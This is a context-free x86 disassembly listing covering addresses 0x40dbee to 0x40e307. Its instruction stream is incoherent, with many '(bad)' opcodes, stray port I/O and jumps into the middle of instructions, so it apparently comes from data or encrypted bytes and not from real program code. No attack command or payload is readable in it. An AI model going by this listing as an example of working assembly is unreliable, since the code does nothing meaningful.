  40dbee:	stc    
  40dbef:	sub    eax,0x85079dae
  40dbf4:	jae    0x40dc5d
  40dbf6:	in     al,dx
  40dbf7:	lahf   
  40dbf8:	ds mov ah,0xcf
  40dbfb:	mov    cl,0xab
  40dbfd:	adc    ebx,edi
  40dbff:	lea    esi,[ebp+0x1f470ffc]
  40dc05:	and    ch,BYTE PTR [eax]
  40dc07:	push   ecx
  40dc08:	rcl    BYTE PTR [ecx+0x32c949de],cl
  40dc0e:	inc    eax
  40dc0f:	mov    ds:0xd7fa1212,eax
  40dc14:	ror    DWORD PTR [esi-0x46],0x9b
  40dc18:	inc    esi
  40dc19:	ret    0xc9e
  40dc1c:	sbb    ebx,ebp
  40dc1e:	shl    DWORD PTR [edx],1
  40dc20:	xchg   ebx,eax
  40dc21:	add    DWORD PTR [edi+0x2b],edi
  40dc24:	mov    ah,0x4f
  40dc26:	pushw  ss
  40dc28:	cmp    ecx,DWORD PTR [ebx]
  40dc2a:	and    BYTE PTR [edx],0x30
  40dc2d:	push   ss
  40dc2e:	sub    bl,al
  40dc30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc31:	(bad)  [eax+eiz*8]
  40dc34:	cmp    DWORD PTR cs:[ebx],ebx
  40dc37:	jp     0x40dc28
  40dc39:	xchg   edi,eax
  40dc3a:	xchg   edi,eax
  40dc3b:	inc    edx
  40dc3c:	xchg   ebp,eax
  40dc3d:	inc    ecx
  40dc3e:	ficom  WORD PTR [ecx+0x30c5e599]
  40dc44:	pop    ecx
  40dc45:	mov    dh,0x8
  40dc47:	pusha  
  40dc48:	(bad)  gs:[edx]
  40dc4b:	push   es
  40dc4c:	outs   dx,WORD PTR ds:[esi]
  40dc4e:	out    0x71,eax
  40dc50:	cmp    cl,al
  40dc52:	aas    
  40dc53:	out    0x95,eax
  40dc55:	mov    ds:0x15209685,al
  40dc5a:	out    0xa5,al
  40dc5c:	xor    DWORD PTR [ebp+0x24b85c57],eax
  40dc62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc63:	rol    BYTE PTR [ecx-0xa82a282],1
  40dc69:	scas   eax,DWORD PTR es:[edi]
  40dc6a:	fs jecxz 0x40dc74
  40dc6d:	fmul   DWORD PTR [esi-0x765f91db]
  40dc73:	mov    esp,0xef65b656
  40dc78:	mov    al,0xe8
  40dc7a:	icebp  
  40dc7b:	inc    esp
  40dc7c:	aaa    
  40dc7d:	cdq    
  40dc7e:	test   eax,0x3644f1ab
  40dc83:	std    
  40dc84:	jp     0x40dcca
  40dc86:	pop    esi
  40dc87:	daa    
  40dc88:	and    al,0x2d
  40dc8a:	sti    
  40dc8b:	mov    al,ds:0xa7b5815
  40dc90:	or     bh,cl
  40dc92:	and    ebx,eax
  40dc94:	push   eax
  40dc95:	xor    eax,DWORD PTR [esi]
  40dc97:	mov    cl,0x17
  40dc99:	xor    DWORD PTR [ebp+0x2d],eax
  40dc9c:	and    DWORD PTR [ebp+0x79],esp
  40dc9f:	imul   ebp,DWORD PTR [edx-0x14],0x7be9b848
  40dca6:	js     0x40dc2d
  40dca8:	mov    al,0x81
  40dcaa:	data16 out 0x37,al
  40dcad:	mov    eax,0x7e920a0e
  40dcb2:	out    dx,al
  40dcb3:	test   al,0x42
  40dcb5:	lods   al,BYTE PTR ds:[esi]
  40dcb6:	in     eax,0x76
  40dcb8:	ins    BYTE PTR es:[edi],dx
  40dcb9:	mov    ebx,DWORD PTR [edi+0x2f1ab84f]
  40dcbf:	jmp    0x40dc87
  40dcc1:	mov    eax,0x76a378b
  40dcc6:	test   eax,0xa4cd3031
  40dccb:	mov    bl,0xf1
  40dccd:	push   0x5a
  40dccf:	rcr    DWORD PTR [ecx+0x3d],cl
  40dcd2:	jp     0x40dd05
  40dcd4:	mov    esi,0xd4f494c2
  40dcd9:	xchg   ebx,eax
  40dcda:	sbb    dl,dh
  40dcdc:	cli    
  40dcdd:	or     DWORD PTR [esi],edi
  40dcdf:	jbe    0x40dd53
  40dce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dce2:	mov    esp,esi
  40dce4:	push   es
  40dce5:	sahf   
  40dce6:	pop    es
  40dce7:	sbb    bl,al
  40dce9:	outs   dx,DWORD PTR ds:[esi]
  40dcea:	call   0xa7558c75
  40dcef:	(bad)  
  40dcf1:	or     DWORD PTR [edx+esi*4-0x7b],edx
  40dcf5:	jmp    0x40dd64
  40dcf7:	add    ecx,DWORD PTR [ebp-0x2b39d0af]
  40dcfd:	imul   esp,DWORD PTR [edx-0x25],0x5ca7319a
  40dd04:	sub    dh,bh
  40dd06:	out    0x55,al
  40dd08:	ins    BYTE PTR es:[edi],dx
  40dd09:	shl    DWORD PTR [ebp-0xb],0xba
  40dd0d:	mov    ds:0xd96f02ca,al
  40dd12:	or     eax,edi
  40dd14:	(bad)  
  40dd15:	dec    ebx
  40dd16:	ret    
  40dd17:	loope  0x40dcae
  40dd19:	mov    dl,0xa9
  40dd1b:	fxch   st(0)
  40dd1d:	cwde   
  40dd1e:	leave  
  40dd1f:	mov    dh,0x85
  40dd21:	cmp    edx,DWORD PTR [edi+0x4af7a3c8]
  40dd27:	(bad)  
  40dd28:	lds    eax,FWORD PTR [edi-0xafa2bfd]
  40dd2e:	jp     0x40dcc4
  40dd30:	retf   
  40dd31:	xchg   edi,eax
  40dd32:	adc    ebp,DWORD PTR [eax+0x22be91ed]
  40dd38:	xchg   esp,eax
  40dd39:	pop    esp
  40dd3a:	lods   al,BYTE PTR ds:[esi]
  40dd3b:	inc    eax
  40dd3c:	pop    ebx
  40dd3d:	adc    al,0x90
  40dd3f:	or     bl,ch
  40dd41:	push   cs
  40dd42:	or     DWORD PTR [ecx+0x5424396c],edi
  40dd48:	cld    
  40dd49:	push   ds
  40dd4a:	dec    esp
  40dd4b:	or     eax,0x2e968b8e
  40dd50:	mov    al,fs:0xb4015556
  40dd56:	lds    esp,FWORD PTR [edx+0x129f2058]
  40dd5c:	xor    dl,BYTE PTR [eax]
  40dd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd5f:	retf   0x6799
  40dd62:	push   cs
  40dd63:	or     DWORD PTR [ebp-0x7ebfd8fd],esi
  40dd69:	imul   eax,DWORD PTR [ecx+0x22],0xffffff8f
  40dd6d:	lds    ecx,FWORD PTR [esi]
  40dd6f:	xor    eax,0xe422de29
  40dd74:	mov    ecx,0x2cef9517
  40dd79:	cmp    ch,dh
  40dd7b:	ret    
  40dd7c:	ins    DWORD PTR es:[edi],dx
  40dd7d:	xor    BYTE PTR [ecx],dh
  40dd7f:	div    BYTE PTR [ecx]
  40dd81:	mov    dl,BYTE PTR [eax+ebx*8]
  40dd84:	add    eax,0xa9fb1ce
  40dd89:	test   bl,al
  40dd8b:	data16 jp 0x40dddd
  40dd8e:	pcmpeqb mm1,QWORD PTR [eax+0x43]
  40dd92:	fmul   QWORD PTR [edi-0xd]
  40dd95:	inc    edi
  40dd96:	cmp    eax,0x4ce85214
  40dd9b:	mov    BYTE PTR [ebx+0x88588b0],dl
  40dda1:	cmc    
  40dda2:	rcl    BYTE PTR [eax],cl
  40dda4:	stos   BYTE PTR es:[edi],al
  40dda5:	cmc    
  40dda6:	iret   
  40dda7:	std    
  40dda8:	mov    bh,0xac
  40ddaa:	ret    0x9cee
  40ddad:	stc    
  40ddae:	adc    ch,dh
  40ddb0:	mov    ecx,0xe092ac5f
  40ddb5:	fwait
  40ddb6:	or     ebp,esi
  40ddb8:	(bad)  
  40ddb9:	pop    eax
  40ddba:	call   DWORD PTR [edi+0x41db4412]
  40ddc0:	cmc    
  40ddc1:	add    eax,0xee4f0ed5
  40ddc6:	test   eax,0xd4e268be
  40ddcb:	xor    al,0x1f
  40ddcd:	fwait
  40ddce:	repz sub al,0xab
  40ddd1:	mov    al,ds:0x70d504f7
  40ddd6:	xor    BYTE PTR [esi+ecx*4-0x42],0xc0
  40dddb:	inc    edi
  40dddc:	mov    edx,0x8e209486
  40dde1:	out    dx,al
  40dde2:	outs   dx,DWORD PTR ds:[esi]
  40dde3:	fs adc al,bl
  40dde6:	push   ebx
  40dde7:	dec    esp
  40dde8:	in     al,0xe5
  40ddea:	pop    ss
  40ddeb:	stos   DWORD PTR es:[edi],eax
  40ddec:	rcl    DWORD PTR [ebp+0xb],1
  40ddef:	sub    edx,eax
  40ddf1:	and    edi,DWORD PTR [ecx+0x1e]
  40ddf4:	adc    eax,0xaef6c459
  40ddf9:	mov    eax,0xbc0e04f1
  40ddfe:	daa    
  40ddff:	sub    esi,ecx
  40de01:	scas   eax,DWORD PTR es:[edi]
  40de02:	and    ebp,ecx
  40de04:	mov    WORD PTR [ecx+0x36],es
  40de07:	(bad)  
  40de08:	test   BYTE PTR [esp+eiz*4+0x69],0xcd
  40de0d:	into   
  40de0e:	cdq    
  40de0f:	xchg   BYTE PTR [ebp+edi*8+0x5c7bf6c2],cl
  40de16:	test   DWORD PTR [esi-0x48],ebx
  40de19:	rcl    bh,0x68
  40de1c:	fwait
  40de1d:	jmp    0x40de0b
  40de1f:	gs pop esp
  40de21:	or     BYTE PTR [edx-0x4f],0x36
  40de25:	jb     0x40de89
  40de27:	add    eax,0xdbd4f392
  40de2c:	fsub   DWORD PTR [eax+0x561d1760]
  40de32:	inc    esi
  40de33:	stos   BYTE PTR es:[edi],al
  40de34:	cmc    
  40de35:	loopne 0x40deb5
  40de37:	jle    0x40de2d
  40de39:	sbb    eax,0xfc73c821
  40de3e:	jmp    0xa24e:0x1b2d8bc8
  40de45:	and    al,bh
  40de47:	test   DWORD PTR [edx+0x6b],0xcd6f13fa
  40de4e:	push   0x1b
  40de50:	pop    ecx
  40de51:	arpl   WORD PTR [eax],cx
  40de53:	mov    ecx,DWORD PTR [ecx]
  40de55:	or     dl,bl
  40de57:	ds (bad) 
  40de59:	jbe    0x40de75
  40de5b:	sbb    eax,0x282f0652
  40de60:	adc    BYTE PTR [eax+0x5145f9da],dh
  40de66:	push   edi
  40de67:	push   edx
  40de68:	dec    esp
  40de69:	sub    al,BYTE PTR [esi]
  40de6b:	or     eax,0x7a349e9
  40de70:	pushf  
  40de71:	jns    0x40de2a
  40de73:	popa   
  40de74:	inc    ecx
  40de75:	inc    esp
  40de76:	(bad)  
  40de77:	fist   WORD PTR [edi-0x7c]
  40de7a:	cdq    
  40de7b:	stc    
  40de7c:	xchg   esi,eax
  40de7d:	push   0x42
  40de7f:	sub    BYTE PTR [eax],dl
  40de81:	aam    0x36
  40de83:	imul   ebp,DWORD PTR [ebx+0x34ec57ae],0x31a373e7
  40de8d:	addr16 loop 0x40de17
  40de90:	and    ecx,edi
  40de92:	test   DWORD PTR [eax+0x1a],eax
  40de95:	loopne 0x40de2c
  40de97:	and    ebx,DWORD PTR [ecx]
  40de99:	mov    edx,0x1ed6efc5
  40de9e:	lahf   
  40de9f:	cld    
  40dea0:	mov    WORD PTR [ebp+edi*4-0x3e1ef0ed],ss
  40dea7:	cmovb  edi,DWORD PTR [ecx*4-0x22b3323]
  40deaf:	(bad)  
  40deb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deb1:	in     eax,dx
  40deb2:	sbb    dl,BYTE PTR [eax]
  40deb4:	pop    esp
  40deb5:	enter  0x507a,0x9b
  40deb9:	xor    ebx,eax
  40debb:	pop    edi
  40debc:	ficom  DWORD PTR [eax+0x19]
  40debf:	xchg   edx,eax
  40dec0:	add    eax,0xc46b910b
  40dec5:	stos   DWORD PTR es:[edi],eax
  40dec6:	sbb    al,0xbd
  40dec8:	xchg   ebx,eax
  40dec9:	mov    cl,0xe3
  40decb:	stos   DWORD PTR es:[edi],eax
  40decc:	loop   0x40de51
  40dece:	pop    eax
  40decf:	jp     0x40de95
  40ded1:	in     al,dx
  40ded2:	jo     0x40dee0
  40ded4:	sub    BYTE PTR [edx-0x40],dh
  40ded7:	cmp    al,0x92
  40ded9:	mov    eax,ds:0xc4716594
  40dede:	les    ebp,FWORD PTR [edx]
  40dee0:	xor    DWORD PTR [edi],ebp
  40dee2:	cmc    
  40dee3:	dec    edx
  40dee4:	mov    esp,eax
  40dee6:	out    0x8b,al
  40dee8:	xor    al,0x54
  40deea:	es pop edi
  40deec:	cmp    eax,0x6ee4099c
  40def1:	cli    
  40def2:	mov    DWORD PTR [edx+eiz*4-0x7d],esi
  40def6:	test   BYTE PTR [ebx+0x77],dl
  40def9:	xadd   BYTE PTR [ebp+0x4930a64a],cl
  40df00:	data16 mov ds:0x290aed60,al
  40df06:	adc    al,0x27
  40df08:	jmp    0x7b4e:0xae714824
  40df0f:	push   ds
  40df10:	ret    
  40df11:	adc    BYTE PTR [ebp-0x18],ah
  40df14:	mov    ah,ah
  40df16:	or     al,0x7
  40df18:	mov    dh,0xd0
  40df1a:	inc    edi
  40df1b:	mov    bl,0x2e
  40df1e:	jae    0x40df10
  40df20:	add    BYTE PTR [ecx],al
  40df22:	and    DWORD PTR [ecx],ebp
  40df24:	pop    edi
  40df25:	pusha  
  40df26:	ja     0x40df71
  40df28:	lahf   
  40df29:	inc    esi
  40df2a:	mov    ebx,0x437e9b82
  40df2f:	jp     0x40df62
  40df31:	loopne 0x40decc
  40df33:	in     al,0xd1
  40df35:	or     DWORD PTR [ebp-0x48],eax
  40df38:	xchg   ebx,eax
  40df39:	outs   dx,DWORD PTR ds:[esi]
  40df3a:	clc    
  40df3b:	mov    eax,0x25eee21d
  40df40:	mov    ah,0x8e
  40df42:	repnz push ecx
  40df44:	pop    edx
  40df45:	add    esp,DWORD PTR [esi]
  40df47:	clc    
  40df48:	ficom  WORD PTR [eax+0x6e]
  40df4b:	es xchg edi,eax
  40df4d:	fisubr DWORD PTR [ecx+0x34432cc8]
  40df53:	dec    ebp
  40df54:	push   es
  40df55:	fdivr  st,st(5)
  40df57:	cmc    
  40df58:	dec    DWORD PTR [esi-0x841de08]
  40df5e:	int3   
  40df5f:	xchg   ebp,eax
  40df60:	cmc    
  40df61:	xchg   edx,eax
  40df62:	xchg   edi,eax
  40df63:	inc    esp
  40df64:	sub    DWORD PTR [ecx-0x1800a249],0x1a
  40df6b:	cmovbe esi,DWORD PTR [ebp+ecx*1+0x33]
  40df70:	mov    ch,0xcf
  40df72:	test   DWORD PTR [edi+0x4815f3f3],0xcc5b3f7d
  40df7c:	jp     0x40dff1
  40df7e:	ins    BYTE PTR es:[edi],dx
  40df7f:	out    dx,al
  40df80:	mov    edx,DWORD PTR [edi+0x13568aae]
  40df86:	ret    
  40df87:	cmp    al,BYTE PTR [eax+0x7bdd0273]
  40df8d:	inc    esp
  40df8e:	dec    esp
  40df8f:	pop    eax
  40df90:	pop    ds
  40df91:	jg     0x40df22
  40df93:	fadd   QWORD PTR [esp+edx*1-0x7f]
  40df97:	fsub   DWORD PTR [ebx-0x80]
  40df9a:	(bad)  
  40df9b:	data16 mov BYTE PTR [ecx],ah
  40df9e:	push   ebx
  40df9f:	or     cl,BYTE PTR [edx]
  40dfa1:	setne  BYTE PTR [edi+edi*4+0x0]
  40dfa6:	adc    BYTE PTR [edx-0x7c73303a],ah
  40dfac:	aaa    
  40dfad:	jb     0x40df34
  40dfaf:	jnp    0x40dfe5
  40dfb1:	fild   QWORD PTR [edi]
  40dfb3:	and    bl,dl
  40dfb5:	xchg   edx,eax
  40dfb6:	les    eax,FWORD PTR [edx]
  40dfb8:	(bad)  
  40dfb9:	push   ss
  40dfba:	mov    DWORD PTR [esi-0x37d4e220],ebp
  40dfc0:	xlat   BYTE PTR ds:[ebx]
  40dfc1:	pusha  
  40dfc2:	enter  0xcc1d,0x88
  40dfc6:	popa   
  40dfc7:	mov    eax,0x2c7b3c22
  40dfcc:	jb     0x40dfa2
  40dfce:	cdq    
  40dfcf:	jmp    0x40dfba
  40dfd1:	push   edx
  40dfd2:	fs dec eax
  40dfd4:	and    eax,0xcc6db719
  40dfda:	scas   eax,DWORD PTR es:[edi]
  40dfdb:	dec    esi
  40dfdc:	aas    
  40dfdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfde:	cwde   
  40dfdf:	pushf  
  40dfe0:	lock ds jle 0x40dfde
  40dfe4:	popa   
  40dfe5:	stos   DWORD PTR es:[edi],eax
  40dfe6:	mov    al,0x8a
  40dfe8:	lods   eax,DWORD PTR ds:[esi]
  40dfe9:	sbb    al,0xee
  40dfeb:	ins    DWORD PTR es:[edi],dx
  40dfec:	push   ss
  40dfed:	lahf   
  40dfee:	imul   esi,DWORD PTR [ebx-0x72],0xea01f5a3
  40dff5:	fldcw  WORD PTR [eax+ebp*4+0x46268c84]
  40dffc:	xchg   DWORD PTR [eax-0x42c84f5c],eax
  40e002:	lea    ebx,[ebx+0x1c]
  40e005:	inc    esi
  40e006:	cmp    DWORD PTR [edx+edi*8+0x5c],ebp
  40e00a:	xchg   ebp,eax
  40e00b:	mov    dl,0x7b
  40e00d:	mov    eax,0xd80cf245
  40e012:	fst    st(2)
  40e014:	pushf  
  40e015:	scas   al,BYTE PTR es:[edi]
  40e016:	mov    esp,0x894969b8
  40e01b:	mov    ds:0x8e599372,eax
  40e020:	add    al,0xff
  40e022:	pop    ecx
  40e023:	push   esp
  40e024:	imul   edi,DWORD PTR cs:[esi+0x6c],0x5c
  40e029:	rcr    DWORD PTR [eax+0x1b],0x4
  40e02d:	fwait
  40e02e:	mov    bh,0x4f
  40e030:	push   edi
  40e031:	xor    DWORD PTR ds:0x77463607,edx
  40e037:	xlat   BYTE PTR ds:[ebx]
  40e038:	cmp    cl,ah
  40e03a:	mov    dh,0xaf
  40e03c:	cmp    al,0xc0
  40e03e:	rcr    BYTE PTR [edi],1
  40e040:	mov    al,0x5b
  40e042:	cli    
  40e043:	lock push 0xfee79f39
  40e049:	adc    al,0xaa
  40e04b:	sbb    al,cl
  40e04d:	cmp    al,0xc9
  40e04f:	sub    bl,BYTE PTR [ebx]
  40e051:	dec    edx
  40e052:	and    ebx,ebp
  40e054:	push   esp
  40e055:	jb     0x40dfea
  40e057:	pop    DWORD PTR [edi]
  40e059:	xchg   esi,eax
  40e05a:	jg     0x40e0ca
  40e05c:	dec    ecx
  40e05d:	xchg   edx,eax
  40e05e:	lahf   
  40e05f:	mov    edi,0x4b57f61a
  40e064:	mov    ch,0xb5
  40e066:	cmc    
  40e067:	clc    
  40e068:	lahf   
  40e069:	fcom   QWORD PTR [ebx]
  40e06b:	cdq    
  40e06c:	pop    eax
  40e06d:	cmc    
  40e06e:	ins    BYTE PTR es:[edi],dx
  40e06f:	mov    bl,0x3c
  40e071:	xor    bl,BYTE PTR [ebp+0x60b46a78]
  40e077:	cdq    
  40e078:	aam    0x7d
  40e07a:	dec    ebp
  40e07b:	or     ch,BYTE PTR [esi-0x7b]
  40e07e:	lds    eax,FWORD PTR [edx-0x44]
  40e081:	push   0xffffff8e
  40e083:	fs (bad) 
  40e085:	je     0x40e0da
  40e087:	sub    al,0x4e
  40e089:	or     DWORD PTR [edx],edx
  40e08b:	push   ebx
  40e08c:	pop    edx
  40e08d:	enter  0x4ed8,0x2b
  40e091:	sub    eax,DWORD PTR [ebx]
  40e093:	es mov bl,0x40
  40e096:	mov    BYTE PTR [edi],0x6c
  40e099:	or     esi,esp
  40e09b:	mov    DWORD PTR [ebx+edi*1-0x3006dec2],esi
  40e0a2:	popf   
  40e0a3:	sti    
  40e0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a5:	fwait
  40e0a6:	sub    al,0xd6
  40e0a8:	pusha  
  40e0a9:	xchg   DWORD PTR [esi],ecx
  40e0ab:	push   esi
  40e0ac:	push   ecx
  40e0ad:	adc    DWORD PTR [ecx-0x18],ecx
  40e0b0:	xchg   esp,eax
  40e0b1:	mov    ds:0x38edc83a,eax
  40e0b6:	push   ds
  40e0b7:	dec    eax
  40e0b8:	and    DWORD PTR [edi+ebx*4],esi
  40e0bb:	dec    ebp
  40e0bc:	pusha  
  40e0bd:	mov    DWORD PTR [ebx],0xe444e175
  40e0c3:	pop    ebx
  40e0c4:	push   ebx
  40e0c5:	repnz data16 fdivr DWORD PTR [ecx]
  40e0c9:	test   DWORD PTR [edi-0x7365b4ea],esp
  40e0cf:	fwait
  40e0d0:	les    sp,DWORD PTR [ebx+0x1]
  40e0d4:	aad    0xd2
  40e0d6:	xchg   ebx,eax
  40e0d7:	(bad)  
  40e0d8:	cmp    ebp,DWORD PTR [edx+eax*2+0x74fc55e3]
  40e0df:	cli    
  40e0e0:	(bad)  
  40e0e1:	mov    ebx,0x9d8223e9
  40e0e6:	ret    
  40e0e7:	sub    dl,BYTE PTR [edi+0x44]
  40e0ea:	or     esp,DWORD PTR [eax]
  40e0ec:	and    al,0x53
  40e0ee:	xor    al,0xe6
  40e0f0:	add    dh,BYTE PTR [ecx]
  40e0f2:	xor    DWORD PTR [esi],ecx
  40e0f4:	int    0xb2
  40e0f6:	(bad)  
  40e0f8:	stos   DWORD PTR es:[edi],eax
  40e0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0fa:	mov    dl,0xb8
  40e0fc:	xchg   esi,eax
  40e0fd:	stc    
  40e0fe:	sbb    DWORD PTR [ebx-0x3c],esp
  40e101:	fist   WORD PTR [ecx+0x7e]
  40e104:	arpl   WORD PTR [edx-0x7e97fa1c],sp
  40e10a:	loope  0x40e0a3
  40e10c:	mov    DWORD PTR es:[eax+0x32],ebx
  40e110:	jb     0x40e092
  40e112:	pop    ss
  40e113:	out    0x79,eax
  40e115:	scas   al,BYTE PTR es:[edi]
  40e116:	pop    ecx
  40e117:	and    DWORD PTR [ecx-0x30a9bf26],esp
  40e11d:	jnp    0x40e0fe
  40e11f:	push   ebx
  40e120:	pop    esi
  40e121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e123:	je     0x40e12d
  40e125:	add    DWORD PTR [ebp-0x61],0xffffff82
  40e129:	repz (bad) 
  40e12b:	sbb    bl,cl
  40e12d:	rol    DWORD PTR [edx+0x6c937c8d],cl
  40e133:	pop    ecx
  40e134:	mov    esi,0x50f7d8da
  40e139:	push   edi
  40e13a:	xor    BYTE PTR [eax+0x2],0x9b
  40e13e:	sbb    al,0x72
  40e140:	cdq    
  40e141:	gs out dx,eax
  40e143:	jne    0x40e11c
  40e145:	scas   eax,DWORD PTR es:[edi]
  40e146:	loopne 0x40e0db
  40e148:	pop    ecx
  40e149:	stc    
  40e14a:	jp     0x40e143
  40e14c:	xchg   edi,eax
  40e14d:	das    
  40e14e:	inc    esp
  40e14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e150:	adc    eax,0xfa788fb
  40e155:	out    0xf6,eax
  40e157:	xor    DWORD PTR [eax-0x2e],0x1dc9c9
  40e15e:	(bad)  
  40e15f:	sahf   
  40e160:	add    al,0x60
  40e162:	(bad)  
  40e164:	int3   
  40e165:	and    BYTE PTR [esi+0x16f960bb],dl
  40e16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e16c:	cs je  0x40e166
  40e16f:	popa   
  40e170:	push   esp
  40e171:	imul   esp,DWORD PTR [edx-0xc150964],0xc594886d
  40e17b:	jmp    0xc30ec35f
  40e180:	fst    DWORD PTR [ecx-0x71]
  40e183:	sbb    cl,bh
  40e185:	jmp    0x40e1f0
  40e187:	push   ebp
  40e188:	and    DWORD PTR [eax-0x72e18c32],edi
  40e18e:	push   edx
  40e18f:	pop    ebp
  40e190:	fs cli 
  40e192:	cmp    bh,bh
  40e194:	xchg   ebx,eax
  40e195:	sub    DWORD PTR [edx+0x76],0xfffffff1
  40e199:	add    dh,0x6d
  40e19c:	ins    BYTE PTR es:[edi],dx
  40e19d:	or     dl,cl
  40e19f:	jb     0x40e1ac
  40e1a1:	sbb    edi,ebp
  40e1a3:	in     al,dx
  40e1a4:	or     ch,bl
  40e1a6:	inc    edi
  40e1a7:	pop    edi
  40e1a8:	adc    al,0xf2
  40e1aa:	mov    ch,0x5b
  40e1ac:	mov    edx,0xc080a27b
  40e1b1:	push   esp
  40e1b2:	mov    eax,0xb17c9ac2
  40e1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b8:	addr16 sbb al,0x15
  40e1bb:	push   ecx
  40e1bc:	xchg   DWORD PTR ds:0x87a572b7,ebp
  40e1c2:	pop    ebp
  40e1c3:	mov    ds:0x12792720,eax
  40e1c8:	pop    esp
  40e1c9:	inc    esi
  40e1ca:	fisttp WORD PTR [ecx+0x670f39a4]
  40e1d0:	cwde   
  40e1d1:	jle    0x40e200
  40e1d3:	sbb    ebp,DWORD PTR [ebp-0x6c]
  40e1d6:	sub    eax,0x5af0f259
  40e1db:	mov    ah,0x6
  40e1dd:	push   0x0
  40e1df:	jmp    0x40e22d
  40e1e1:	mov    ds:0x14535551,eax
  40e1e6:	idiv   DWORD PTR [edx+0x3a]
  40e1e9:	pop    edx
  40e1ea:	js     0x40e218
  40e1ec:	pop    es
  40e1ed:	in     al,0xe8
  40e1ef:	nop
  40e1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f1:	and    eax,0xf2e74c07
  40e1f6:	sbb    al,0x9a
  40e1f8:	mov    dh,0xca
  40e1fa:	aam    0x70
  40e1fc:	xor    DWORD PTR [edx+0x45],edx
  40e1ff:	dec    esp
  40e200:	xchg   ebp,eax
  40e201:	cmc    
  40e202:	shl    DWORD PTR [esi],0x9b
  40e205:	je     0x40e268
  40e207:	xchg   edx,eax
  40e208:	out    0x9f,al
  40e20a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e20b:	test   DWORD PTR [edi+0x142c6241],ebx
  40e211:	xchg   edi,eax
  40e212:	push   ebx
  40e213:	out    0x58,al
  40e215:	push   ecx
  40e216:	sub    DWORD PTR [edi],ecx
  40e218:	inc    ebx
  40e219:	cmp    al,0xfe
  40e21b:	fsubr  QWORD PTR [edx+0x32]
  40e21e:	and    esp,DWORD PTR [eax+ebx*1+0x5f]
  40e222:	add    DWORD PTR ds:[esi],0x37
  40e226:	adc    DWORD PTR [eax-0x4e389c83],0xffffff8e
  40e22d:	adc    DWORD PTR [edi-0x43b09696],ebx
  40e233:	dec    eax
  40e234:	bound  eax,QWORD PTR [eax]
  40e236:	push   ebx
  40e237:	test   eax,0xafe6e263
  40e23c:	std    
  40e23d:	scas   eax,DWORD PTR es:[edi]
  40e23e:	aad    0x3f
  40e240:	icebp  
  40e241:	jge    0x40e1d3
  40e243:	sahf   
  40e244:	pop    ebx
  40e245:	mov    ds:0x7665c8a4,eax
  40e24a:	test   eax,0x1c85d3ac
  40e24f:	adc    DWORD PTR [edx+0x6c],esp
  40e252:	push   ebp
  40e253:	xchg   ebx,eax
  40e254:	rcr    DWORD PTR [ebp-0x7ce216d9],0xab
  40e25b:	scas   al,BYTE PTR es:[edi]
  40e25c:	pushf  
  40e25d:	lea    ecx,[edi+ecx*4]
  40e260:	lahf   
  40e261:	mov    ah,0x38
  40e263:	repz mov ah,0x55
  40e266:	jnp    0x40e2de
  40e268:	mov    esp,0xac773d4b
  40e26d:	adc    bh,dl
  40e26f:	shr    BYTE PTR [ecx],cl
  40e271:	fs out dx,al
  40e273:	or     eax,0xf91f3190
  40e278:	or     eax,DWORD PTR [ebx-0x5f658bd6]
  40e27e:	push   eax
  40e27f:	inc    ebx
  40e280:	out    dx,eax
  40e281:	inc    ebx
  40e282:	dec    eax
  40e283:	outs   dx,DWORD PTR ds:[esi]
  40e284:	sub    dl,BYTE PTR [ebx]
  40e286:	cmp    BYTE PTR [edx],dl
  40e288:	push   ebx
  40e289:	repnz mov ah,BYTE PTR [edi-0x655685bf]
  40e290:	or     bl,al
  40e292:	out    0xab,al
  40e294:	or     dh,0x36
  40e297:	push   ecx
  40e298:	adc    BYTE PTR [eax],cl
  40e29a:	scas   eax,DWORD PTR es:[edi]
  40e29b:	sub    cl,al
  40e29d:	cmp    ch,BYTE PTR [ecx]
  40e29f:	adc    dl,BYTE PTR [edi+0x14]
  40e2a2:	cs xchg edi,eax
  40e2a4:	std    
  40e2a5:	outs   dx,BYTE PTR ds:[esi]
  40e2a6:	pop    DWORD PTR [edx-0x45]
  40e2a9:	fsub   DWORD PTR [esi-0x30]
  40e2ac:	stc    
  40e2ad:	jmp    0xb85c:0x6e08fe1d
  40e2b4:	fisttp DWORD PTR [ecx]
  40e2b6:	test   DWORD PTR [edi],ecx
  40e2b8:	sbb    eax,0xa50ca063
  40e2bd:	ds test al,0x90
  40e2c0:	(bad)  
  40e2c1:	xchg   ebp,eax
  40e2c2:	mul    al
  40e2c4:	sti    
  40e2c5:	xchg   al,dh
  40e2c7:	call   0x78d9:0x4b4b2fae
  40e2ce:	mov    ch,0xb6
  40e2d0:	in     eax,0x85
  40e2d2:	pop    es
  40e2d3:	adc    esi,DWORD PTR [eax]
  40e2d5:	leave  
  40e2d6:	pushf  
  40e2d7:	mov    ds:0xf6882200,al
  40e2dc:	sub    edx,ebp
  40e2de:	mov    ch,dh
  40e2e0:	leave  
  40e2e1:	ja     0x40e293
  40e2e3:	lds    eax,FWORD PTR [edi]
  40e2e5:	or     esi,eax
  40e2e7:	int    0xd7
  40e2e9:	push   0x1c53790b
  40e2ee:	pusha  
  40e2ef:	aas    
  40e2f0:	(bad)  [ebp-0x7b390187]
  40e2f6:	cmp    al,0x1a
  40e2f8:	cld    
  40e2f9:	pop    ebp
  40e2fa:	sub    BYTE PTR [esp+edx*2+0x57],0x27
  40e2ff:	xor    bl,BYTE PTR [ecx+0x33]
  40e302:	xchg   edi,eax
  40e303:	pushf  
  40e304:	fcmovu st,st(0)
  40e306:	dec    edi
  40e307:	ins    DWORD PTR es:[edi],dx
